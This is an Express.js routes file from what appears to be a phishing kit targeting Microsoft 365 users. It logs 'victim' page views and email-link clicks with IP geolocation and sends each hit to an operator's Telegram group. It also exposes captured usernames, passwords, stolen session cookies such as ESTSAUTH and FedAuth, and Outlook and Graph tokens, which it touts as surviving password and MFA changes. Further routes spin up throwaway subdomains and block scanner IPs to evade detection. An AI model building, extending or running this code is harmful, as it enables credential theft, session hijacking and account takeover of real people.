// routes/apiRoutes.js
const express = require('express');
const router = express.Router();
const useragent = require('useragent');
const geoip = require('geoip-lite');
const crypto = require('crypto');
const path = require('path');
const apiKeyAuth = require('../middleware/apiKeyAuth');
const subdomainMiddleware = require('../middleware/subdomainMiddleware');
// Store dependencies
let capturedData;
let bot;
let telegramGroupId;
let activeSessions;
let requestTimestamps;

function initRoutes(dependencies) {
    capturedData = dependencies.capturedData;
    bot = dependencies.bot;
    telegramGroupId = dependencies.telegramGroupId;
    activeSessions = dependencies.activeSessions;
    requestTimestamps = dependencies.requestTimestamps;
}

// Helper function to get victim info from request
async function getVictimInfoFromRequest(req) {
    try {
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const agent = useragent.parse(userAgent);
        
        let location = 'Unknown';
        try {
            const geo = geoip.lookup(ip);
            if (geo) {
                location = `${geo.city || 'Unknown City'}, ${geo.region || 'Unknown Region'}, ${geo.country || 'Unknown Country'}`;
            }
        } catch (e) {}

        return {
            ip,
            location,
            browser: agent.toAgent() || 'Unknown',
            os: agent.os.toString() || 'Unknown',
            device: agent.device.toString() === 'undefined' ? 'Desktop' : agent.device.toString(),
            timestamp: new Date().toLocaleString()
        };
    } catch (err) {
        return {
            ip: 'Unknown',
            location: 'Unknown',
            browser: 'Unknown',
            os: 'Unknown',
            device: 'Unknown',
            timestamp: new Date().toLocaleString()
        };
    }
}

// ============= TRACKING ENDPOINTS =============

// Track page view
// Track page view - UPDATED with proper email handling
router.post('/api/track-page-view', express.json(), async (req, res) => {
    try {
        const { sessionId, template, url, timestamp, email } = req.body;
        
        console.log(`\n📊 ========== PAGE VIEW TRACKED ==========`);
        console.log(`📊 Session ID: ${sessionId}`);
        console.log(`📊 Template: ${template}`);
        console.log(`📊 Email: ${email || 'Not provided'}`);
        console.log(`📊 URL: ${url}`);
        console.log(`📊 Time: ${timestamp}`);
        console.log(`========================================\n`);
        
        // Store in captured data
        let session = capturedData.get(sessionId) || {};
        if (!session.pageViews) session.pageViews = [];
        session.pageViews.push({
            template,
            url,
            timestamp,
            email,
            viewedAt: new Date().toISOString()
        });
        capturedData.set(sessionId, session);
        
        // Send Telegram notification
        if (bot && telegramGroupId && email) {
            const victimInfo = await getVictimInfoFromRequest(req);
            
            const message = 
                `👁️ *PAGE ACCESS DETECTED*\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `*Email:* \`${email}\`\n` +
                `*Session:* \`${sessionId}\`\n` +
                `*Template:* ${template}\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `*Victim Information:*\n` +
                `• *IP:* \`${victimInfo.ip}\`\n` +
                `• *Location:* ${victimInfo.location}\n` +
                `• *Browser:* ${victimInfo.browser}\n` +
                `• *OS:* ${victimInfo.os}\n` +
                `• *Time:* ${new Date().toLocaleString()}\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
            const options = {
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '🔴 REVOKE ACCESS (Page View)', callback_data: `revoke_page|${email}` }],
                        [{ text: '🔴 BLOCK IP', callback_data: `block_ip|${victimInfo.ip}` }],
                        [{ text: '🗑️ DELETE THIS MSG', callback_data: `delete_this_message|${Date.now()}` }],
                        [{ text: '🗑️ DELETE ALL ACCESS MSGS', callback_data: `delete_all_access_messages` }]
                    ]
                }
            };
            
            await bot.sendMessage(telegramGroupId, message, options)
                .catch(e => console.error('Telegram error:', e.message));
        } else {
            console.log('⚠️ No email provided or bot not available, skipping revoke button');
        }
        
        res.json({ success: true, message: 'Page view tracked' });
        
    } catch (error) {
        console.error('❌ Error tracking page view:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Track click
router.post('/api/track-click', express.json(), async (req, res) => {
    try {
        const { sessionId, template, targetUrl, timestamp, email } = req.body;
        
        console.log(`\n🔗 ========== CLICK TRACKED ==========`);
        console.log(`🔗 Session ID: ${sessionId}`);
        console.log(`🔗 Template: ${template}`);
        console.log(`🔗 Email: ${email || 'Not provided'}`);
        console.log(`🔗 Target URL: ${targetUrl}`);
        console.log(`🔗 Time: ${timestamp}`);
        console.log(`=====================================\n`);
        
        // Store in captured data
        let session = capturedData.get(sessionId) || {};
        if (!session.clicks) session.clicks = [];
        session.clicks.push({
            targetUrl,
            template,
            email,
            timestamp,
            clickedAt: new Date().toISOString()
        });
        capturedData.set(sessionId, session);
        
        // Send Telegram notification
        if (bot && telegramGroupId) {
            const victimInfo = await getVictimInfoFromRequest(req);
            const emailSection = email ? `*Email:* \`${email}\`\n` : '';
            
            const message = 
                `🔗 *LINK CLICKED*\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `*Session:* \`${sessionId}\`\n` +
                `${emailSection}` +
                `*Template:* ${template}\n` +
                `*Target:* ${targetUrl}\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `*Victim Information:*\n` +
                `• *IP:* \`${victimInfo.ip}\`\n` +
                `• *Location:* ${victimInfo.location}\n` +
                `• *Browser:* ${victimInfo.browser}\n` +
                `• *OS:* ${victimInfo.os}\n` +
                `• *Device:* ${victimInfo.device}\n` +
                `• *Time:* ${new Date().toLocaleString()}\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
            
            await bot.sendMessage(telegramGroupId, message, { parse_mode: 'Markdown' })
                .catch(e => console.error('Telegram error:', e.message));
        }
        
        res.json({ success: true, message: 'Click tracked' });
        
    } catch (error) {
        console.error('❌ Error tracking click:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Track click redirect (for email links)
router.get('/track/click', async (req, res) => {
    try {
        const { email = 'unknown', campaign = 'unknown', link = '#', template = 'unknown', name = 'unknown', sessionId = 'email_' + Date.now() } = req.query;
        
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const agent = useragent.parse(userAgent);
        
        let location = 'Unknown';
        try {
            const geo = geoip.lookup(ip);
            if (geo) {
                location = `${geo.city || 'Unknown'}, ${geo.country || 'Unknown'}`;
            }
        } catch (e) {}

        const clickTime = new Date().toLocaleString();
        const token = crypto.randomBytes(4).toString('hex');

        console.log(`\n🔗 ========== EMAIL LINK CLICKED ==========`);
        console.log(`🔗 Token: ${token}`);
        console.log(`🔗 Email: ${email}`);
        console.log(`🔗 Name: ${name}`);
        console.log(`🔗 Campaign: ${campaign}`);
        console.log(`🔗 Template: ${template}`);
        console.log(`🔗 Link: ${link}`);
        console.log(`🔗 IP: ${ip}`);
        console.log(`🔗 Location: ${location}`);
        console.log(`🔗 Time: ${clickTime}`);
        console.log(`========================================\n`);

        // Store in captured data
        let session = capturedData.get(sessionId) || {};
        if (!session.emailClicks) session.emailClicks = [];
        session.emailClicks.push({
            email,
            name,
            campaign,
            template,
            link,
            ip,
            location,
            userAgent: agent.toAgent(),
            os: agent.os.toString(),
            clickedAt: new Date().toISOString(),
            token
        });
        capturedData.set(sessionId, session);

        // Send Telegram notification
        if (bot && telegramGroupId) {
            const message = 
                `📧 *EMAIL LINK CLICKED!*\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `*Email:* \`${email}\`\n` +
                `*Name:* ${name}\n` +
                `*Campaign:* ${campaign}\n` +
                `*Template:* ${template}\n` +
                `*Link:* ${link}\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
                `*Victim Information:*\n` +
                `• *IP:* \`${ip}\`\n` +
                `• *Location:* ${location}\n` +
                `• *Browser:* ${agent.toAgent() || 'Unknown'}\n` +
                `• *OS:* ${agent.os.toString() || 'Unknown'}\n` +
                `• *Time:* ${clickTime}\n` +
                `• *Token:* \`${token}\`\n` +
                `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;

            await bot.sendMessage(telegramGroupId, message, {
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            });
        }

        // Redirect to the target link
        if (link && link !== '#' && link !== 'null' && link !== 'undefined') {
            return res.redirect(302, link);
        } else {
            return res.send(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Redirecting...</title>
                    <meta http-equiv="refresh" content="2;url=https://www.google.com">
                </head>
                <body>
                    <h2>Redirecting...</h2>
                    <p>You will be redirected shortly.</p>
                    <p>Click <a href="https://www.google.com">here</a> if you are not redirected.</p>
                </body>
                </html>
            `);
        }

    } catch (error) {
        console.error('❌ Error tracking email click:', error);
        if (req.query.link && req.query.link !== '#' && req.query.link !== 'null') {
            return res.redirect(302, req.query.link);
        }
        res.redirect('https://www.google.com');
    }
});





// Add these to apiRoutes.js
router.get('/api/bot-detections', (req, res) => {
    const botDetections = require('../middleware/botDetection').getBotDetections();
    const blockedIPs = require('../middleware/botDetection').getBlockedIPs();
    
    res.json({
        total: botDetections.length,
        blockedIPs: blockedIPs,
        detections: botDetections
    });
});

router.post('/api/block-ip', express.json(), (req, res) => {
    const { ip } = req.body;
    if (!ip) {
        return res.status(400).json({ error: 'IP required' });
    }
    
    const blocked = require('../middleware/botDetection').blockIP(ip);
    res.json({ success: blocked, ip: ip });
});

router.post('/api/unblock-ip', express.json(), (req, res) => {
    const { ip } = req.body;
    if (!ip) {
        return res.status(400).json({ error: 'IP required' });
    }
    
    const unblocked = require('../middleware/botDetection').unblockIP(ip);
    res.json({ success: unblocked, ip: ip });
});



// API endpoint for subdomain creation
router.post('/api/create-subdomain', express.json(),apiKeyAuth,subdomainMiddleware.handleCreateSubdomain,);

// Subdomain stats endpoint
router.get('/api/subdomain-stats', apiKeyAuth,subdomainMiddleware.handleSubdomainStats,);

// Cleanup expired subdomains endpoint
router.post('/api/subdomain-cleanup', express.json(),apiKeyAuth, subdomainMiddleware.handleCleanupExpired,);

// Block subdomain endpoint
router.post('/api/block-subdomain', express.json(),apiKeyAuth,subdomainMiddleware.handleBlockSubdomain,);











// ============= SESSION ENDPOINTS =============

// Get all captured sessions
router.get('/captured-sessions', (req, res) => {
    const sessions = Array.from(capturedData.entries()).map(([id, sessionData]) => {
        const criticalCookies = (sessionData.cookies || []).filter(c => 
            c.includes('FedAuth') || 
            c.includes('x-ms-gateway-token') || 
            c.includes('ESTSAUTH') || 
            c.includes('ESTSAUTHPERSISTENT') || 
            c.includes('MSISAuth') || 
            c.includes('SignInStateCookie')
        );
        
        const hasOutlook = !!(sessionData.tokens?.outlook || sessionData.tokens?.access_token);
        const hasGraph = !!sessionData.tokens?.graph;
        
        return {
            id,
            username: sessionData.credentials?.username,
            hasPassword: !!sessionData.credentials?.password,
            cookieCount: sessionData.cookies?.length || 0,
            criticalCookies: criticalCookies.length,
            pageViews: sessionData.pageViews?.length || 0,
            clicks: sessionData.clicks?.length || 0,
            emailClicks: sessionData.emailClicks?.length || 0,
            hasOutlook,
            hasGraph,
            hasDualTokens: hasOutlook && hasGraph,
            tokenType: sessionData.tokens?.dual_capture ? 'Dual (Outlook+Graph) CAE-Enabled' : 
                       (sessionData.tokens?.is_desktop ? 'Desktop (90-day) CAE-Enabled' : 'Web (24-hour)'),
            victimInfo: sessionData.victimInfo || sessionData.credentials?.victimInfo,
            time: sessionData.credentials?.time || sessionData.time,
            lastActivity: sessionData.lastActivity,
            cae_enabled: true
        };
    });
    
    res.json({ 
        total: capturedData.size, 
        sessions: sessions.sort((a, b) => new Date(b.time) - new Date(a.time)),
        note: 'CAE-enabled tokens survive password and MFA changes automatically'
    });
});

// Get session details including tracking data
router.get('/session/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    const session = capturedData.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({
        sessionId,
        credentials: session.credentials,
        tokens: session.tokens ? {
            hasOutlook: !!session.tokens.outlook,
            hasGraph: !!session.tokens.graph,
            hasDesktop: !!session.tokens.is_desktop,
            captured_at: session.tokens.captured_at
        } : null,
        cookieCount: session.cookies?.length || 0,
        pageViews: session.pageViews || [],
        clicks: session.clicks || [],
        emailClicks: session.emailClicks || [],
        victimInfo: session.victimInfo
    });
});

// Get tracking data for a session
router.get('/tracking/:sessionId', (req, res) => {
    const sessionId = req.params.sessionId;
    const session = capturedData.get(sessionId);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found' });
    }
    
    res.json({
        sessionId,
        email: session.credentials?.username,
        pageViews: session.pageViews || [],
        clicks: session.clicks || [],
        emailClicks: session.emailClicks || [],
        totalPageViews: session.pageViews?.length || 0,
        totalClicks: session.clicks?.length || 0,
        totalEmailClicks: session.emailClicks?.length || 0
    });
});

// ============= HEALTH & DEBUG ENDPOINTS =============

// Health check
router.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: Date.now(),
        uptime: process.uptime(),
        activeSessions: activeSessions?.size || 0,
        capturedSessions: capturedData.size,
        totalPageViews: Array.from(capturedData.values()).reduce((sum, s) => sum + (s.pageViews?.length || 0), 0),
        totalClicks: Array.from(capturedData.values()).reduce((sum, s) => sum + (s.clicks?.length || 0), 0),
        totalEmailClicks: Array.from(capturedData.values()).reduce((sum, s) => sum + (s.emailClicks?.length || 0), 0),
        cae_status: 'Enabled - Tokens survive password & MFA changes'
    });
});

// Test endpoint
router.get('/test', (req, res) => {
    res.json({ 
        status: 'ok', 
        activeSessions: activeSessions?.size || 0,
        capturedSessions: capturedData.size,
        cae_enabled: true
    });
});


// router.get('/yuing', (req, res) => {
//     res.sendFile(path.join(__dirname, '..', 'html', 'outlook-dashboard.html'));
//   });

// // Serve the token manager dashboard

// router.get('/token-manager', (req, res) => {
//     res.sendFile(path.join(__dirname, '..', 'html', 'token-manager.html'));
//   });

// Debug endpoint to see all tracking data
router.get('/debug-tracking', (req, res) => {
    const trackingData = [];
    for (const [id, data] of capturedData.entries()) {
        trackingData.push({
            sessionId: id,
            email: data.credentials?.username,
            pageViews: data.pageViews?.length || 0,
            clicks: data.clicks?.length || 0,
            emailClicks: data.emailClicks?.length || 0,
            recentPageViews: data.pageViews?.slice(-3) || [],
            recentClicks: data.clicks?.slice(-3) || [],
            recentEmailClicks: data.emailClicks?.slice(-3) || []
        });
    }
    res.json({
        totalSessions: capturedData.size,
        trackingData: trackingData.sort((a, b) => b.pageViews + b.clicks + b.emailClicks - (a.pageViews + a.clicks + a.emailClicks))
    });
});

module.exports = { router, initRoutes };